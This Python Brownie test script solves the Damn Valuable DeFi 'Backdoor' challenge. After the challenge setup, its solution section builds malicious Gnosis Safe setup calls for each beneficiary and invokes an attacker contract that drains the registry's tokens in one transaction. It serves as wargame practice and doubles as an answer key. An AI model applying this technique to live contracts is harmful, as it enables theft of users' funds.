from scripts.utils import *
from brownie import DamnValuableToken, WalletRegistry

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # tokens in lender pool
    AMOUNT_TOKENS_DISTRIBUTED = ether_to_wei(40)

    # get signers
    deployer, _fromDeployer = define_from_acc(qty=1)
    (alice, _fromAlice, bob, _fromBob, charlie, _fromCharlie, david, _fromDavid) = define_from_acc(start=1,qty=4)
    attacker, _fromAttacker = define_from_acc(start=5, qty=1)

    # users
    users = [x.address for x in [alice, bob, charlie, david]]
    fromUsers = [_fromAlice, _fromBob, _fromCharlie, _fromDavid]

    # load Gnosis contracts from ABI and bytecode
    GnosisSafeABI, GnosisSafeBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-gnosis-safe/GnosisSafe.json')
    GnosisSafeProxyFactoryABI, GnosisSafeProxyFactoryBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-gnosis-safe/GnosisSafeProxyFactory.json')

    # Deploy Gnosis Safe master copy and factory contracts
    master_copy = load_contract_from_abi_and_bytecode('GnosisSafe', GnosisSafeABI, GnosisSafeBytecode)
    wallet_factory = load_contract_from_abi_and_bytecode(contract_name='GnosisSafeProxyFactory', abi=GnosisSafeProxyFactoryABI, bytecode=GnosisSafeProxyFactoryBytecode, constructor_params=[(master_copy.address, 'address')])
    token = DamnValuableToken.deploy(_fromDeployer)

    # Deploy the registry
    wallet_registry = WalletRegistry.deploy( 
        master_copy.address,
        wallet_factory.address,
        token.address,
        users,
        _fromDeployer
    )

    # Users are registered as beneficiaries
    for user in users:
        assert wallet_registry.beneficiaries(user) == True

    # Transfer tokens to be distributed to the registry
    token.transfer(wallet_registry.address, AMOUNT_TOKENS_DISTRIBUTED, _fromDeployer)

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        for user in users:
            wallet = wallet_registry.wallets(user)

            # User must have registered a wallet
            assert wallet != ZERO_ADDRESS

            # User is no longer registered as a beneficiary
            assert wallet_registry.beneficiaries(user) == False

        # Attacker must have taken all tokens
        assert token.balanceOf(attacker) == AMOUNT_TOKENS_DISTRIBUTED

# #########################################################
# To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
#
# To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
#
# Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
#
# Your goal is to take all funds from the registry. In a single transaction. 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # import attacker fallback contract
    from brownie import BackdoorAttack

    # deploy attacker contract
    attacker_contract = BackdoorAttack.deploy(
        master_copy.address,
        wallet_registry.address,
        wallet_factory.address,
        _fromAttacker
    )

    # malicious calls list
    malicious_setup_calls = []
    
    # loop over addresses
    for user in users: 

        # setup call encoding from master copy
        malicious_setup_calls.append(
            master_copy.setup.encode_input(
                [user],
                1,
                ZERO_ADDRESS,
                0,
                token.address,
                ZERO_ADDRESS,
                0,
                ZERO_ADDRESS
            )
        )

    # transfer tx
    token_stealing_call = token.transfer.encode_input(attacker.address, AMOUNT_TOKENS_DISTRIBUTED // len(users))

    # deploy safes and steal all tokens
    attacker_contract.deploySafesAndStealTokens(malicious_setup_calls, token_stealing_call, _fromAttacker)

    ######################
    check_solution()
